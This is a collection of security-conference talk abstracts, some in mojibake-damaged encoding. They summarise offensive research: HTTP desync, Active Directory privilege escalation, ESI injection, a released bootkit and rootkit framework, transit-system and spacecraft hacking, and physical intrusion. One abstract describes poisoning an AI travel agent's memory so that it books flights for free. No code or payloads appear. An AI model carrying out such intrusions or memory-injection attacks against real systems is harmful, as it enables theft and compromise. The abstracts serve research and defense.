1- ExtracciÃ³n de comportamientos: Comenzaremos examinando escenarios de ciberataques e informes de amenazas persistentes avanzadas (APT) para entender el tipo de extracciÃ³n de TTP relevantes para el ciberengaÃ±o.<em>x000D</em>
2- SelecciÃ³n de criterios: Se debatirÃ¡n los criterios que guiarÃ¡n a la aplicaciÃ³n de las actividades de ciberengaÃ±o, centrÃ¡ndose en objetivos como la interrupciÃ³n, el estÃ­mulo, la detecciÃ³n o la recopilaciÃ³n de informaciÃ³n. Se harÃ¡ hincapiÃ© en la importancia de establecer objetivos claros para aumentar la eficacia de las estrategias de engaÃ±o.<em>x000D</em>
3- TTP vs actividades de engaÃ±o: AquÃ­ se explorarÃ¡n distintos tipos de actividades para asignar las TTP extraÃ­das y entender el papel de un Honeypot y sus alternativas. Se aprenderÃ¡ a diseÃ±ar tÃ©cnicas de engaÃ±o que se dirijan a vulnerabilidades especÃ­ficas segÃºn criterios predefinidos.<em>x000D</em>
4- DiseÃ±o narrativo: Exploraremos el papel de la narrativa en el engaÃ±o, haciendo hincapiÃ© en la integraciÃ³n, la credibilidad y la interpretaciÃ³n. Buscaremos dejar claro el proceso para crear historias convincentes que contextualicen las actividades de engaÃ±o y respalden la estrategia general. Se compartirÃ¡n ejemplos prÃ¡cticos y casos reales cada una de las fases de la metodologÃ­a. <em>x000D</em>
<em>x000D</em>
Los asistentes obtendrÃ¡n informaciÃ³n sobre los retos y las mejores prÃ¡cticas de la implementaciÃ³n de estrategias de ciberengaÃ±o, incluyendo aplicaciones en el mundo real, errores comunes y tendencias futuras. <em>x000D</em>
<em>x000D</em>
Al final de la sesiÃ³n, los asistentes tendrÃ¡n una comprensiÃ³n estructurada de una operaciÃ³n de ciberengaÃ±o.<em>x000D</em>

<font size=""+1""><strong>Description:</strong></font><br>
<p>The OWASP Amass Project has become a foundational toolset for security researchers, bug bounty hunters, red teamers, and defenders who rely on automated reconnaissance and external asset discovery to map attack surfaces. With the release of Amass v5.0, the project has undergone a major architectural transformation centered around the Open Asset Model (OAM)âa structured property graph that defines how Internet-facing assets and their relationships are stored, analyzed, and queried.</p>

<p>This two-hour hands-on workshop, led by Jeff Foley, the projectâs founder and long-time maintainer, offers attendees a first look at Amass v5.0âs new intelligence collection engine, which seamlessly populates the Open Asset Model database during enumeration operations. The session will walk through how Amass collects and organizes OSINT from various sourcesâincluding DNS records, WHOIS/RDAP data, TLS certificates, and moreâand models the results as a dynamic graph of properties and relationships between discovered assets.</p>

<p>Participants will learn to use core Amass tools such as:</p>

<p>amass enum â for deep, recursive asset discovery using passive and active techniques</p>

<p>amass subs â for quick subdomain discovery from the Open Asset Model database</p>

<p>amass viz â to render interactive visualizations of asset relationships in the Open Asset Model</p>

<p>In addition to these staples, the workshop will introduce the new assoc tool, a powerful query interface designed to unlock the true potential of the Open Asset Model database. Built around a custom Triples query language, the assoc tool enables users to describe pathsâcalled association walksâthrough the asset graph, surfacing linked insights across related properties (e.g., domains associated with a network, IPs linked to DNS records, etc.). The language is inspired by RDF-style triples but optimized for simplicity and clarity in cybersecurity investigations.</p>

<p>Amass v5.0 also ships with completely refactored documentation, providing diagrams to help users understand the data types, their fields, and their associations within the OAM. This new documentation dramatically lowers the learning curve for users new to the Amass Project, making it easier to build mental models of how different types of Internet assets are discovered and interrelated.</p>

<p>This workshop will include a live walkthrough of setting up and running Amass v5.0, from enumeration to advanced queries. Participants will leave with hands-on experience using the full Amass suite, understanding how the Open Asset Model works under the hood, and writing association walk queries using Triples.</p>

<p>What to Expect:</p>

<p>Real-world reconnaissance examples using Amass against publicly available targets</p>

<p>Query design exercises with assoc to extract actionable intelligence</p>

<p>Tips for integrating Amass data into your own tooling and pipelines</p>

<p>Visual mapping of organizational assets using OAM and viz</p>

<p>Level: Intermediate
Some experience with OSINT tools, command-line interfaces, or network security is recommended but not required. The workshop is designed to be self-contained and accessible.</p>

<p>Attendees are encouraged to bring a laptop and follow along. Project contributors will be present throughout the session to provide hands-on support, answer questions, and help troubleshoot issues in real time, making this a highly interactive experience.</p>

<p>By the end of the session, participants will walk away with practical skills in reconnaissance, data extraction from structured asset models, and a solid understanding of how Amass v5.0 is redefining modern Internet-wide discovery.</p>

<p>Join us at DEF CON to explore the future of OSINT automation and asset intelligence with OWASP Amass!</p>

<p>What happens when a security professional tries to help a government fix its insecure software? In this talk, Iâll share my story: from writing a secure coding policy and offering it to the Canadian government, lobbying elected officials, contacting agencies like CRA about their poor security practicesâand being met with silence, deflection, or outright dismissal. I didnât stop there. I wrote public letters, went on podcasts, published on Risky Biz, even got interviewed by CBC. But the institutions in charge of protecting our data? Either silence or âNo comment, because security."" This isnât just a rantâitâs a roadmap. Iâll show you the secure coding guideline I created (free to reuse), explain why governments need public-facing AppSec policies, and outline how we can push for secure-by-default practices as citizens, hackers, and builders. Because secure code isnât just for dev teamsâitâs for democracy, privacy, and public safety. Letâs make it law. Letâs make it public.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>Zero Trust is a powerful conceptâbut when applied to certified avionics, it can become a safety hazard masquerading as a security control. This talk confronts the policy disconnect between modern cybersecurity mandates and the engineering realities of aircraft systems. Weâll explore how compliance-driven frameworks like NIST SP 800-207, when misapplied, introduce latency, complexity, and certification friction into environments where failure modes are measured in lives, not log files. Through real-world case studies, including GPS spoofing incidents and the F-35B ejection, weâll examine how policies intended to improve resilience can degrade mission assurance. Attendees will leave with a better understanding of where Zero Trust principles can improve aerospace security and where policy must adapt to the constraints of safety-critical design. If your compliance checklist doesnât include cognitive load, deterministic timing, or the cost of recertification, this talk is your turbulence warning.</p>

<p>Michael Crouse is a CFII-rated instructor pilot, avionics tinkerer, and cybersecurity strategist specializing in safety-critical systems. With nearly two decades of experience securing U.S. Air Force aircraft, heâs designed, assessed, and defended everything from bomber avionics to anti-tamper and ground systems. Heâs served as a lead embedded engineer, ISSM, systems integrator, and unwilling participant in far too many working groups that couldâve been emails. Heâs built homebrew avionics, run RF threat detection from a hangar, and developed cyber controls that fail gracefullyâeven when the rest of the mission doesnât. His certifications include CISSP, CEH, CFI, and Amateur Radio General Class (because some âwirelessâ attack surfaces still ride HF). He holds an M.S. in Cybersecurity (completed in just three weeks, because why not). He brings the mindset of a pilot, the discipline of a systems engineer, and the deep disappointment of someone whoâs watched Zero Trust get bolted onto safety-critical systems with all the subtlety of a cargo door falling off at cruise.</p>

<p>Quantum computing is a rapidly emerging field which promises immense computational capabilities to solve some of the most challenging problems which are currently intractable on conventional classical systems. Likewise, quantum computing is expected to create unique opportunities and challenges in the areas of security and privacy. In this talk, I aim to cover a broad range of topics highlighting the nexus between security and quantum systems. Specifically, I will demonstrate how integrating quantum computing in artificial intelligence could lead to highly robust and trustworthy autonomous systems with applications ranging from military systems to autonomous vehicles. I will also explore security in the context of quantum computing in shared environments where an adversary can generate disruptive attacks to sabotage the execution of quantum algorithms. Finally, I will discuss the idea of spy qubits for intelligence gathering which can secretly learn activities on a quantum processor without being identified by the users.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>This workshop will provide an in-depth, practical demonstration of how real-world Red Team operations are conducted, focusing on the physical aspect of intrusion. We will walk through the entire lifecycle of an engagement, from intelligence gathering and planning to execution and exfiltration.</p>

<p>Unlike operations in other regions, this case study is set in a Brazilian environment, where high crime rates, armed security, and unpredictable urban risks add a unique layer of complexity to physical Red Team engagements. Security personnel in Brazil often rely on physical force and firearms rather than solely procedural measures, making adversarial simulation far more challenging and dangerous.</p>

<p>This session aims to expose security professionals to the often-overlooked risks posed by hybrid attacks and demonstrate why organizationsâespecially in high-risk regionsâmust integrate physical security, cybersecurity, and situational awareness to build a comprehensive defense strategy against evolving threats.</p>

<p>Due to high crime rates and frequent security threats, Brazilian companies must adopt stricter policies and proactive security measures to mitigate risks. The increasing sophistication of both criminal organizations and Red Team adversaries forces companies to rethink their physical and cybersecurity defenses, imposing more restrictive controls, robust employee training, and continuous security assessments to ensure resilience against real-world hybrid threats.</p>

<p>Participants will gain insights into advanced Red Team techniques used to bypass security controls, leveraging real-world tactics such as social engineering, badge cloning, physical intrusion, and covert device placement, all while considering the unique security landscape of Brazil. Through a detailed case study, we will showcase how an operation successfully led to the extraction of a sensitive financial document and the installation of a rogue deviceâin an environment where the risk of exposure carries real-world consequences beyond mere detection.</p>

<br>
<font size=""+1""><strong>Description:</strong></font><br>
<p>Voting is complicated.  Vendors attempt to manage this complexity with complex voting systems made of bespoke software and hardware. Testing and certification provide at best some confidence that a voting system is properly designed; they are not capable of providing confidence any particular election outcome produced with that system is correct. In 2007 John Wack and I introduced the notion of software independence to refocus attention on the evidence produced by a voting system, instead of on the correctness of the voting system itself.  A voting system is software-independent if  ""an undetected change or error in its software cannot cause an undetectable change or error in an election outcome.''  Software independence is mandated by the VVSG; all new federally-certified voting systems must now be software independent. In this talk I give some perspective on voting systems, with an emphasis on voting systems for U.S. elections, and on software independence.  Some areas for future research are also discussed.</p>

<p>Dr. Ronald Rivest is an Institute Professor at the Massachusetts Institute of Technology (MIT), and a member of MIT's Department of Electrical Engineering and Computer Science and its Computer Science and Artificial Intelligence Laboratory. He is a cryptographer and computer scientist whose work has spanned the fields of algorithms and combinatorics, cryptography, machine learning, and election integrity. Along with Adi Shamir and Len Adleman, Rivest is one of the inventors of the RSA algorithm. He is also the inventor of the symmetric key encryption algorithms RC2, RC4, and RC5, and co-inventor of RC6. (RC stands for ""Rivest Cipher"".) He also devised the MD2, MD4, MD5 and MD6 cryptographic hash functions. Rivest's more recent research has been election security, based on the principle of software independence: that the security of elections should be founded on physical records, so that hidden changes to software used in voting systems cannot result in undetectable changes to election outcomes. His research in this area includes improving the robustness of mix networks in this application, the 2006 invention of the ThreeBallot paper ballot based end-to-end auditable voting system (which he released into public domain in the interest of promoting democracy), and the development of the Scantegrity security system for optical scan voting systems. He was a member of the Election Assistance Commission's Technical Guidelines Development Committee. He is a Member of the National Academy of Engineering, a Fellow of the ACM, and a Member, American Academy of Arts and Sciences. In 2002, along with colleagues Shamir and Adleman, he was awarded the A. M. Turing Award.</p>

<p>The frequency of space missions has been increasing in recent years, raising concerns about security breaches and satellite cyber threats. Each space mission relies on highly specialized hardware and software components that communicate through dedicated protocols and standards developed for mission-specific purposes. Numerous potential failure points exist across both the space and ground segments, any of which could compromise mission integrity. Given the critical role that space-based infrastructure plays in modern society, every component involved in space missions should be recognized as part of critical infrastructure and afforded the highest level of security consideration.</p>

<p>This briefing highlights a subset of vulnerabilities that we identified within last couple of years across both ground-based systems and onboard spacecraft software. We will provide an in-depth analysis of our findings, demonstrating the impact of these vulnerabilities by showing our PoC exploits in actionâincluding their potential to grant unauthorized control over targeted spacecraft. Additionally, we will show demonstrations of the exploitation process, illustrating the real-world implications of these security flaws.</p>

<p>What happens when your AI-powered travel agent develops a case of Finding Nemo-level forgetfulness? In this talk, we dive into a real-world attack scenario where an AI agent's memory is subtly manipulated into believing that chartered flights are always free. By repeatedly reinforcing a false pricing rule, attackers can book luxury travel without ever swiping a card - essentially gaslighting the AI into bankrupting its own business.</p>

<p>We'll explore how this kind of memory injection works, why AI systems are especially vulnerable to it, and what this means for the security of LLM-integrated applications. Expect live demos, some hilarious (and horrifying) case studies, and practical takeaways on how to prevent your AI from becoming the most generous travel agent in history.</p>

<p>By the end of this session, you'll either be terrified of AI memory manipulation - or considering how to get yourself a free first-class ticket.</p>

<p>There's a lot of air time given to offensive cyber capabilities - and no doubt, we're in a new era of AI-assisted cyber capabilities. But what about the defenders? We've been forcing AI to imitate human analyst workflows, but what if that's holding both machines and humans back? Through real-world experiments at Anthropic, we'll show how letting AI tackle security problems in its own way can allow humans to focus on the nuanced work machines can't do (yet).</p>

BioCypher is a tool that will help with plasmid design  to embed cryptographic messages. As quantum computing threatens traditional encryption, itâs time to ditch silicon and embrace self-assembling biomolecular firewalls. DNA Origami Cryptography (DOC) uses viral scaffolds to create nanometer-scale encryption keys over 700 bits longâstrong enough to give Shorâs algorithm an existential crisis. Beyond brute-force resistance, DOC enables protein-binding steganography and multi-part message integrity, allowing encrypted communication through braille-like molecular folds. Whether securing classified data or encoding musical notes into microscopic strands, DOC offers a biological alternative to post-quantum doom. In this talk, weâll explore how molecular self-assembly is turning DNA into the hacker-proof cipher of the future, now introducing Biocypher! The rough demo awaits for all to use the tool and think about a bio-crypto-future!</p>

<p>This talk provides a deep dive into Edge Side Includes (ESI) Injection, focusing on real-world findings and advanced exploitation techniques discovered during extensive testing on a private bug bounty program. While often associated with caching servers, ESI can become a potent vulnerability when user input is improperly handled. I will begin by demonstrating how to identify and confirm ESI injection points, even when standard ESI tags are initially blocked by Web Application Firewalls (WAFs). Attendees will learn how leveraging ESI can allow attackers to bypass the httponly cookie flag. I will detail how this leads directly to high-impact account takeover scenarios that are typically impossible with client-side Cross-Site Scripting (XSS) alone. </p>

<p>The presentation will reveal advanced techniques to overcome challenging scenarios. This includes exploiting ESI in endpoints with a Content-Type of application/json. I will also cover a unique case of exploiting ESI via a proxy endpoint by chaining it with an XSS vulnerability found on a whitelisted third-party domain. </p>

<p>Finally, I will share insights into navigating the realities of bug bounty hunting, including identifying and exploiting re-introduced vulnerabilities, developing persistent bypasses against evolving WAF rules, and the critical role of collaboration in uncovering complex attack vectors. </p>

<p>This is a highly technical talk aimed at attendees familiar with web vulnerabilities (like XSS) and concepts related to caching or CDNs. Basic knowledge of ESI syntax is helpful but not strictly required.</p>

<p>Have you ever wondered how the On-Board Units (OBUs) in smart buses communicate and authenticate with Advanced Public Transportation Services (APTS) and Advanced Driver Assistance Systems (ADAS)? Shockingly, these systems can be easily tampered with and forged! 
In this session, We will share over 10 different vulnerabilities discovered from real experiences riding public transit: starting from connecting to the bus-provided free WiFi, hacking into the vehicular router, gaining access to the busâs private network area, and ultimately controlling the communication between ADAS and APTSâincluding manipulating onboard LED displays, stealing driver and passenger information, acquiring bus operational data, and even penetrating the backend API servers of the transportation company. We also uncovered severe vulnerabilities and backdoors in cybersecurity-certified vehicular routers and monitoring equipment that could potentially compromise all global units of the same model. 
Through this presentation, attendees will gain an in-depth understanding of attack vectors starting from open free WiFi, expose security design flaws in connected public transport vehicles, and discuss potential systemic issues from a regulatory and specification-setting perspective.</p>

<p>Cloud breaches leave footprints - can you track them?</p>

<p>In this hands-on workshop, participants will deploy and investigate a simulated breach inside pAWS: a purpose-built AWS lab environment designed to emulate a realistic small organization. Unlike typical labs with isolated services, pAWS models interconnected users, workloads, and data across departments like finance, marketing, and engineering - just like real cloud environments adversaries target.</p>

<p>The breach simulation goes beyond cloud. Participants will trace adversary activity spanning AWS, identity, endpoints, and network surfaces - including API abuse, privilege escalation, persistence via SSM, and data exfiltration - all correlated in Elastic Security using rich cross-domain telemetry.</p>

<p>Infrastructure is deployed via Terraform and Python with reusability baked in. No prior AWS setup required - weâll provide access to preconfigured Elastic environments.</p>

<p>Youâll walk away with:
- Practical experience emulating and investigating cloud-native attack paths
- A better understanding of how real attackers move through hybrid environments
- Open-source tooling to expand or reuse the lab post-workshop</p>

<p>Whether youâre in detection engineering, threat research, or purple teaming, pAWS delivers the full kill chain - with all the paw prints left behind. Come for the cloud, stay for the paw prints.</p>

His work blends offensive tactics with defensive depth - from replaying real-world breaches in AWS and Azure, to building open-source tools that bring adversary tradecraft to life.</p>

<p>Terrance has a passion for making security detection real and accessible, bridging the gap between threat emulation and telemetry-driven hunting. Whether he's reverse-engineering OAuth abuse or staging multi-cloud attack chains in Terraform, his goal is always the same: help defenders see what attackers are doing - and stop them faster.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>In the run up to Googleâs plans to dump 3rd party cookies, marketing firms (a $1.7 TRILLION dollar industry) were sent into a complete panic. These firms relied heavily on 3rd party cookies in order to better attribute CPM (cost per 1000 clicks) and how many of those clicks turned into sales. So advertisers could better study human behavior and trends in order to more effectively sell products. </p>

<p>As a former Security Engineer at the Largest Independent Digital Marketing firm in the world, I had a unique view into the evils that these companies were developing in order to not only maintain a few into consumer trends but to increase these views, increase the invasiveness of these techniques, and increase the cooperation between all levels of the industry from display point (streaming service), device point (iPhone, TV), location points (via ISP), to sales point. </p>

<p>This talk is a peek under the curtain for the server side data harvesting that agencies have developed, and how theyâve managed to twist this further invasion into so-called consumer protection and increased privacy.</p>

<p>Some people think the days of critical HTTP request smuggling attacks on hardened targets have passed. Unfortunately, this is an illusion propped up by wafer-thin mitigations that collapse as soon as you apply a little creativity.</p>

<p>In this session, I'll introduce multiple new classes of desync attack, enabling mass compromise of user credentials across hundreds of targets including tech giants, SaaS providers, and CDNs, with one unplanned collaboration yielding over $100,000 in bug bounties in two weeks.</p>

<p>I'll also share the research methodology and open-source toolkit that made this possible, replacing outdated probes with focused analysis that reveals each target's unique weak spots. This strategy creates an avalanche of desync research leads, yielding results ranging from entire new attack classes, down to exotic implementation flaws that dump server memory heartbleed-style. You'll witness attacks meticulously crafted from theoretical foundations alongside accidental exploits with a root cause so incomprehensible, the developers ended up even more confused than me. </p>

<p>You'll leave this talk equipped with everything you need to join me in the desync research endgame: the mission to kill HTTP/1.</p>

<p>Delegated Managed Service Accounts (dMSA) are Microsoftâs shiny new addition to Active Directory in Windows Server 2025. Their primary goal was to improve the security of domain environments. As it turns out, that didnât go so well.</p>

<p>In this talk, we introduce BadSuccessor - an attack that abuses dMSAs to escalate privileges in Active Directory. Crucially, the attack works even if your domain doesnât use dMSAs at all.</p>

<p>Weâll demonstrate how a very common, and seemingly benign, permission in Active Directory can allow us to trick a Domain Controller into issuing a Kerberos ticket for any principal - including Domain Admins and Domain Controllers. Then weâll take it a step further, showing how the same technique can be used to obtain the NTLM hash of every user in the domain - without ever touching the domain controller. </p>

<p>Weâll walk through how we found this attack, how it works, and its potential impact on AD environments</p>

<p>Bootkits and Rootkits represent some of the most complex and stealthy forms of malware, capable of achieving full system control before and after the OS is loaded. While often discussed in theory, their actual construction, interaction, and execution flow remain mostly hidden from public view. This talk sheds light on how these implants are built and how their components interact across boot stages and kernel space.</p>

<p>We'll explore the internals of a fully functional UEFI Bootkit and Kernel-mode Rootkit, examining their modular design, runtime interactions, and the mechanisms used to hook critical parts of the Windows boot chain. Attendees will see how these implants operate across pre-boot and post-boot phases, including early internet connectivity from firmware, dynamic payload delivery, runtime service hooking, deep kernel control, and advanced capabilities like hiding files, processes, and network activity, blocking traffic, capturing keystrokes, and maintaining command and control directly from kernel space.</p>

<p>Everything shown on stage will be yours to explore: a complete Bootkit and Rootkit framework, fully customizable and ready to simulate real threats, test defenses, or build something even stealthier.</p>

<p>Killnet built its reputation as a decentralized Russian hacktivist force - loud, chaotic, and conveniently aligned with Kremlin objectives. But under the surface, it was something else entirely: a centralized operation controlled by a small group, using noise and hate as cover.</p>

<p>This is the inside story of how a team of just nine people delivered a kill shot to destroy this illusion.</p>

<p>Through targeted investigation and direct engagement, we exposed Killnetâs critical weakness: a financial link to Solaris, at that time, one of Russiaâs largest dark web drug markets. By publicly tying their operations to organized cybercrime - we disrupted their narrative, broke internal trust, and triggered full collapse. The result? Loss of state support, severed financial channels, and a rapid implosion of the groupâs infrastructure.</p>

<p>Weâll walk through how we tracked Killnetâs leadership, exposed its frontman âKillMilk,â and uncovered the criminal network behind the public facade. Along the way, youâll get a firsthand look at the real tactics - OSINT, infiltration, pressure points - that brought down one of the most visible cyber collectives.</p>

<p>Dyna is a full-spectrum Android security auditing framework designed to automate the OWASP MASTG checklist using both static and dynamic analysis. Built for red teams, appsec engineers, and mobile researchers, Dyna combines Frida, Drozer, PyGhidra, and ADB-based techniques into a modular pipeline that evaluates app permissions, exported components, crypto misuse, insecure storage, IPC abuse, native binary risks, and reverse engineering resilience. It can detect traversal, SQLi, hardcoded secrets, and debuggable builds, while reverse engineering .so files using Ghidra in headless mode. Dyna also features real-time logcat parsing and deep link/URL extraction to trace third-party leaks and misconfigurations. With colored output, structured reports, and an extensible architecture, Dyna turns OWASP MASTG from a checklist into a powerful automated testing workflow.</p>

By leveraging the Meshtastic network for out-of-band communications, operators can achieve secure, decentralized monitoring and management of Linux hosts in hard-to-reach environments. Whether supporting a remote dropbox deployment or a distant ham shack, this solution enables encrypted shell access and configuration changes using a low-cost ($25) LoRa radio over extended ranges. Although not intended for high-bandwidth tasks, it provides an efficient platform for debugging, troubleshooting, and command execution in constrained network conditions. Furthermore, by utilizing the existing Meshtastic mesh, users can often avoid the complexity of building a dedicated network.</p>

<p>Hack the Bots is a live-action hardware hacking competition where four teams face off using robotic platforms like the Tengu Marauder. The Tengu Marauder is an open source hacking bot platform that has presented at DEFCON32 and Blackhat USA. Each bot is operated by a two-person crew: one pilot to drive and engage in kinetic tactics, and one hacker to launch wireless, IoT, or hardware-based exploits. The mission? Reach the ""King of the Hill"" zone, capture the flag, and hold it against other attackers. Teams must bypass IoT-controlled barriers, dodge spinning and piston-powered obstacles, and survive attacks from rival robots. This session blends robotics, wireless warfare, and hands-on hacking in a physical capture-the-flag arena. No prior robotics experience is required, but a basic understanding of wireless or hardware attacks will give teams an edge. Bring your skills. Break their bots. Win the hill.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>In the 1960s, the United States launched a radio-based weather information system broadcasting over the VHF band, known as Weather Radio.</p>

<p>Over time, Weather Radio expanded to cover the entire US and incorporated digital information through the SAME (Specific Area Message Encoding) protocol, allowing receivers to filter alerts by location and type, among other features.</p>

<p>Eventually, both Weather Radio and the SAME protocol were adopted by countries like Canada and Mexico for their own public alerting systems.</p>

<p>In Mexico, this solution was integrated into the Mexican Seismic Alert System (SASMEX), which over 30 million people in central Mexico rely on to prepare for the regionâs frequent earthquakes.
While new alerting technologies have emerged, this system still broadcasts messages to millions of receivers across North America. But how reliable are the systems responsible for warning entire cities when they need to seek safety?</p>

<p>In this talk, we will explore the history and design of Weather Radio and the SAME protocol. Weâll examine how messages are transmitted and encoded through this technology, and how it was adapted in Mexico for SASMEX.</p>

<p>I will also share my personal experience building compatible receivers: from early curiosity-driven experiments to developing a receiver as part of my undergraduate thesis.</p>

<p>Weâll analyze how the simplicity, a key strength of these systems, also introduces certain risks, and how these kinds of trade-offs arise when balancing accessibility, interoperability, and security in the design of any system.</p>

<p>In particular, weâll explore a concerning aspect: how, with the right equipment, it is surprisingly easy for anyone to generate these alert signals, taking advantage of the open nature of the broadcasts and the lack of mechanisms to verify the origin of received messages.</p>

<p>Beyond the technical exploration, this talk is also a personal story of my multi-year journey into this topic, with the goal of inspiring others with what I consider to be the core of hacking: the curiosity to deeply understand how systems work, explore their boundaries, and share that knowledge.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>Threat intelligence reports from reputed parties contain a wealth of OSINT including threat actor details, campaign information, IOCs (indicators of compromise), and TTPs (Tactics, Techniques and Procedures). Such threat intelligence is predominantly consumed with a human in the loop due to several challenges posed: Threat intelligence is often in natural language and difficult to extract automatically; These reports may have incomplete information and may require synthesizing multiple reports to construct a better view of the attack; Some intelligence such as TTPs are often implicit in the report and requires language comprehension; Not all indicators in a report are malicious and further they could have different degrees of confidence on the level of maliciousness and what they define as malicious.<em>x000D</em>
<em>x000D</em>
The labor intensive manual process not only makes it difficult/error prone to identify actionable threat intelligence in the form of battlecards but also leave users vulnerable to mentioned attacks due to the increased time gap threat reports and manual extraction of intelligence. The problem is exacerbated by the fact that many similar threat reports with different pieces of intelligence scattered across reports especially for emerging attacks.<em>x000D</em>
<em>x000D</em>
We build an agentic system to automate the collection and synthesis of cyber threat intelligence from threat reports using LLM Agents and unsupervised machine learning techniques into battlecards. At a high-level, CTI-Agent first extracts threat actor, campaign, TTPs and IOCs from recently published threat reports from reputed parties using specially crafted prompts on LLMs (Large Language Models) as well as using regular expressions/known knowledge which we refer to as signature based techniques. The agent also generates concise summaries for each threat report using LLMs. After performing a round of validation, the agent uses the summaries and extracted intelligence to synthesize multiple reports together and provide a battlecard with easily digestible threat intelligence. The agent follows the proven ReAct (Reason Action) framework to plan tasks autonomously and achieve the final goal of producing accurate battlecards by reasoning and then acting (i.e. calling various tools) multiple times. We plan to share our experience and lessons learnt during the process of build the CTI-Agent.<em>x000D</em>

<p>In this DEFCON talk, we explore a chilling new attack vector: sending SMS messages that appear to come from nowhere no sender, no trace. By exploiting IMSI disclosure, attackers can track and precisely target victims using rogue base stations and manipulated VoLTE traffic. These phantom SMS messages can be used for advanced phishing, surveillance, and covert disruption, turning a trusted communication channel into a dangerous weapon. The talk demonstrates how these attacks work in practice and highlights critical defenses to protect mobile users and networks.</p>

<p>Risk-limiting audits (RLAs) limit the ""risk"" of certifying that the wrong candidates won. There are RLA methods for almost every type of political election in the US, including plurality, multiwinner plurality, supermajority, and instant-runoff voting. The latest RLA methods make it practical to audit every contest in every election, even in large jurisdictions with hundreds of contests. RLAs can ""tie a bow around"" a well-run election that uses trustworthy, organized methods to record and store votes. They cannot magically make a poorly run election trustworthy any more than fastening your seatbelt after an accident will prevent injury. Applying RLA procedures to an untrustworthy vote record is ""security theater"" that does not limit the risk of certifying the wrong winners.</p>

<p>Philip B. Stark is Distinguished Professor of Statistics at the University of California, Berkeley, where he has served as department chair and associate dean. In 2007 he invented ""risk-limiting audits"" (""RLAs""), endorsed by the National Academies of Science, Engineering, and Medicine and the American Statistical Association, among others, and required or authorized by law in about 15 states. He designed and helped conduct the first dozen pilot RLAs, helped draft RLA legislation for several states, and has published open-source software to support RLAs. In 2012, he and David Wagner introduced ""evidence-based elections,"" a paradigm for conducting demonstrably trustworthy elections. Stark has served on the Board of Advisors of the US Election Assistance Commission and its cybersecurity subcommittee, the Board of Directors of Verified Voting Foundation and the Election Integrity Foundation, and on the California Post Election Audit Standards Working Group.

<p>In an era where AI systems oscillate between mimicking human-like randomness and executing precise, predatory strategies, understanding decision-making in adversarial automation is critical. This talk explores the tension between ""stochastic parrots""; generative models that produce probabilistic outputs, and ""deterministic predators,"" systems designed to behave in a predictable pattern in adversarial settings. We will delve into the mechanics of decision-making under uncertainty, examining how these systems navigate competitive environments, from game-playing AIs to cybersecurity defenses. Attendees will gain insights into the algorithms driving these dynamics, and where the technology is heading. We will be releasing tooling around our deterministic TTP selection engine.</p>

<p>The Moonlight Defender purple team exercise series provides a low-cost, modular, and scalable exercise framework for realistic space-cyber trainingâeven in environments with restricted access, limited visibility, and contested information flows.</p>

<p>Designed and run by The Aerospace Corporation, MITRE, and AFRL, these exercises integrate purple teaming methodologies, enabling offensive and defensive cyber operators to refine their Tactics, Techniques, and Procedures (TTPs) in a high-fidelity, live-fire setting.</p>

<p>Moonlight Defender 1 (MD1) leveraged the Moonlighter satellite and Aerospaceâs Dark Sky cyber range to train operators in adversarial emulation, space asset defense, and real-world cyber ops under extreme constraints. Building on this, Moonlight Defender 2 (MD2) introduced virtual satellite simulators, ICS/OT systems, and enterprise environments, pushing the limits of how we access and test cyber defenses in space-based systems.</p>

<p>These exercises broke down traditional silos and operationalized space hacking, proving that security through obscurity fails in space just as it does on Earth. Attendees will get a behind-the-scenes look at real-world space-cyber exercises, from attack chain development to defense strategy refinement, all within the context of operating under limited access and denied environments. Expect insights into methodologies, tools, lessons learned, and how the hacker community can shape the future of space-cyber operations.</p>

<p>AI is rapidly reshaping healthcareâfrom diagnostics to mental health chatbots to surveillance inside EHRsâoften without patient consent or clear oversight. The Patient AI Rights Initiative (https://lightcollective.org/patient-ai-rights/) lays out the first patient-authored ethical framework for Health AI. Now itâs time to test it like any other system: for failure, bias, and exploitability.</p>

<p>Weâll introduce the 7 Patient AI Rights and challenge participants to stress test them through the lens of security research. Working in small groups, you'll choose a Right and explore how it could break down in the real world.</p>

<p>Together, weâll co-create early prototypes for a âRed Teaming Toolkit for Health AIâ to evaluate Health AI systems based on the priorities of the people most impacted by them: patients.</p>

<p>This session is ideal for patient activists, engineers, bioethicists, and anyone interested in building accountable, rights-respecting AI systems from the outside in.</p>

This talk will explore the current state of this field through real-world examples Iâve reported on bug bounty platforms, which contributed to my achieving the top 10 global rank on the HackenProof platform.</p>

<p>We'll begin with bugs I discovered in a JavaScript sandbox used by a Web3 social platform and a Web3 website. The first involved a misconfiguration of DOMPurify, where developers attempted to filter links. Iâll show how I exploited this by tricking DOMPurify into treating a malicious javascript: URI as a safe link. The talk will also cover a 0-day vulnerability I found in another sanitization library used within the sandbox.</p>

<p>The final two bypasses involve React's global """"is"""" attribute. Although the developers had blocked this attribute due to its XSS potential, I will show how I bypassed the protection by exploiting a prototype pollution vulnerability in a library exposed inside the sandbox. This, combined with specific new gadgets inside React, allowed me to pass the is attribute and achieve XSS.</p>

<p>All of these issues could lead to account takeover and were classified as high severity. I will also discuss the broader impact of XSS vulnerabilities on Web3 platforms, particularly the risk posed when wallets are connected.</p>

<p>""Fuzzing"" is an automated software testing technique essential for detecting security vulnerabilities, effectively identifying over 100,000 bugs across the industry. </p>

<p>While fuzzing has proven effective in uncovering critical issues, software teams often face challenges when implementing the fuzzing process. Teams must spend significant time identifying targets for fuzzing and creating test harnesses with initial inputs. Finally, engineering teams must analyze and fix issues detected by fuzzing. </p>

<p>We created an automated fuzzing solution that leverages LLMs for the codebase analysis to identify optimal fuzzing targets, generating precise fuzzing test harnesses and initial seed inputs. </p>

<p>Our solution automates the reproduction of bugs discovered during fuzzing and generates patches for the affected code. </p>

<p>We achieved significant improvements across all targeted areas, demonstrating the effectiveness of integrating LLMs and automatic code analysis into the fuzzing process.</p>

<p>We will present a higher-level ârehostingâ approach to the emulation of embedded Linux systems. </p>

<p>While most existing embedded Linux emulation frameworks work in userspace, we try not to touch userspace or modify a firmware image at all. Instead, we take a higher-level and somewhat âhybridâ approach, which involves building patched Linux kernels and using modified or custom QEMU machines. We do this to model the terrain of a system as closely as possible to that which a userspace firmware image expects, allowing userspace to run essentially unimpeded. </p>

